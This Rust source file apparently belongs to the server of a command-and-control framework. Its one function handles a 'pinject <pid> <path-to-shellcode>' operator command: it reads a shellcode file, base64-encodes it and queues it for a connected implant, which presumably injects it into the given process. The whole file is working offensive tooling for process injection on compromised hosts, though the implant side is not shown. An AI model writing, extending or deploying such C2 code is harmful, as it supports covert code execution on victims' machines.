use server::links::Links;
use actix_web::web;

// internal packages
use crate::server;

pub fn process_inject(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 3 {
        println!("pinject <pid> <path-to-shellcode>\n   eg: pinject 1307 /tmp/shellcode.bin");
        return
    }
    let shellcode = match std::fs::read(command[2].clone()) {
        Err(e)          => { println!("{}", e); return },
        Ok(shellcode)   => shellcode,
    };
    let shellcode_b64 = base64::encode(shellcode);
    let mut updated_command = command.clone();
    updated_command[2] = shellcode_b64;
    links.links.lock().unwrap()[link_index].set_command(updated_command.join(" "));
}
